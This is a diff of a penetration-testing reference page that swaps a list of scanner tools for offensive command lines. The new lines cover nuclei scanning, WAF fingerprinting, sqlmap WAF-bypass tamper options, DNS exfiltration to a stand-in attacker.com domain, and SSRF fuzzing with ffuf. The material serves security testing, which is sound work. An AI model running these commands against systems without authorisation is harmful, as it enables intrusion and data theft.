@@ -1,53 +1,50 @@
-# Scanning Tools
+# Vulnerability Scanning Tools: Configuration & Bypass
 
-## Vulnerability Scanners
-| Tool | Type | Description |
-|------|------|-------------|
-| Nuclei | Template | Fast YAML-based scanner |
-| Nikto | Web server | Comprehensive web scanner |
-| WPScan | CMS | WordPress vulnerability scanner |
-| Wapiti | Web app | Black-box web scanner |
+## nuclei
 
-## Port & Service Scanners
-| Tool | Description |
-|------|-------------|
-| Nmap | Industry standard network scanner |
-| Masscan | Internet-scale port scanner |
-| Naabu | Fast port scanner by ProjectDiscovery |
-| Rustscan | Rust-based port scanner |
-
-## API Scanners
-| Tool | Description |
-|------|-------------|
-| Kiterunner | API endpoint discovery |
-| Arjun | HTTP parameter discovery |
-| Graphw00f | GraphQL fingerprinting |
-| Inql | GraphQL security testing |
-
-## CMS & Framework Scanners
-| Tool | Target |
-|------|--------|
-| WPScan | WordPress |
-| Joomscan | Joomla |
-| Droopescan | Drupal |
-| CMSmap | WP, Joomla, Drupal |
-
-## TLS/SSL Scanners
-| Tool | Description |
-|------|-------------|
-| testssl.sh | Comprehensive TLS testing |
-| SSLyze | Fast TLS scanner |
-
-## Installation
+### Custom Template Execution
 ```bash
-go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-go install -v github.com/ffuf/ffuf/v2@latest
-pip install arjun wapiti3
-apt install nmap nikto wpscan
+# Run specific severities
+nuclei -l targets.txt -t ~/nuclei-templates/ -severity critical,high
+# Run only custom templates (exclude default)
+nuclei -l targets.txt -t ~/custom-templates/ -e ~/nuclei-templates/
+# Exclude specific tags
+nuclei -l targets.txt -t ~/nuclei-templates/ -etags "dos,fuzz,misc"
 ```
 
----
+### Rate Limiting & OPSEC
+```bash
+nuclei -l targets.txt -t cves/ -rl 50 -c 10 -timeout 5 \
+  --max-host-error 20 -headless-options "-disable-gpu"
+# -rl: rate limit (req/s), -c: concurrency, --max-host-error: skip after N errors
+```
 
-> **Next**: [Exploitation Tools](03-exploitation-tools.md)
+## WAF Detection
+```bash
+wafw00f https://target.com -a  # Identify WAF vendor
+nmap --script http-waf-fingerprint -p 443 target.com
+```
+
+## SQL Injection Automation
+
+### sqlmap (Advanced)
+```bash
+# WAF bypass tamper scripts
+sqlmap -r request.txt --tamper=space2comment,randomcase,charencode --random-agent
+# Deep testing
+sqlmap -r request.txt --level=5 --risk=3 --batch
+# OOB exfiltration
+sqlmap -r request.txt --dns-domain=attacker.com
+# Force DBMS + technique
+sqlmap -r request.txt --dbms=mysql --technique=BT
+```
+
+## SSRF Detection
+
+### Burp Extension: Collaborator Everywhere
+Injects Collaborator URLs into headers and parameters automatically.
+
+### Manual
+```bash
+ffuf -u https://target.com/api/proxy?url=FUZZ -w ssrf_params.txt -ac
+```
